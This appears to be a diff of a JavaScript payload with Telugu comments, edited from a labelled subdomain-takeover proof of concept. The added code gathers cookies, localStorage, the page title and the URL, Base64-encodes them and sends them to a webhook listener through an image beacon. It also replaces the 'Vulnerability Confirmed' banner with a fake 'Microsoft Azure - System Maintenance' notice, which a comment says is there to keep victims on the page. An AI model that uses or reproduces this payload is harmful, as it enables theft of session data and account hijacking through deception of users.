@@ -1,27 +1,20 @@
+
 (function() {
-    // నీ కొత్త వెబ్‌హుక్ లింక్
+    // నీ వెబ్‌హుక్ లింక్ (కచ్చితంగా ఇదే ఉందో లేదో చూసుకో)
     var webhook = "https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/";
 
-    // డేటా సేకరించడం
-    var info = {
-        hacker: "Ramavath Gopi Nayak",
-        cookies: document.cookie || "No Cookies Found",
-        storage: JSON.stringify(localStorage),
-        url: window.location.href
+    var exfil = {
+        title: document.title,
+        url: window.location.href,
+        cookies: document.cookie || "Protected-or-None",
+        storage: JSON.stringify(localStorage)
     };
 
-    // Base64 Encoding
-    var encoded = btoa(JSON.stringify(info));
-
-    // 1. Image Beacon (అత్యంత నమ్మకమైన పద్ధతి)
+    // అత్యంత నమ్మకమైన పద్ధతి: Image Tag
+    var report = btoa(JSON.stringify(exfil));
     var img = new Image();
-    img.src = webhook + "?report=" + encoded;
+    img.src = webhook + "?report=" + report;
 
-    // 2. స్క్రీన్ మీద కనిపిస్తే PoC సక్సెస్ అయినట్టు గుర్తు
-    document.body.innerHTML = `
-        <div style="background:black; color:red; padding:50px; text-align:center; height:100vh;">
-            <h1>Vulnerability Confirmed</h1>
-            <p>Subdomain Takeover by Naik Gopi</p>
-            <p>Session data has been exfiltrated to the listener.</p>
-        </div>`;
+    // విక్టిమ్‌కి ఏదైనా కనిపిస్తేనే వాళ్ళు అక్కడ సేపు ఉంటారు
+    document.body.innerHTML = "<h1 style='color:white; background:blue; padding:20px;'>Microsoft Azure - System Maintenance</h1><p>Please do not close this window while we verify your session...</p>";
 })();
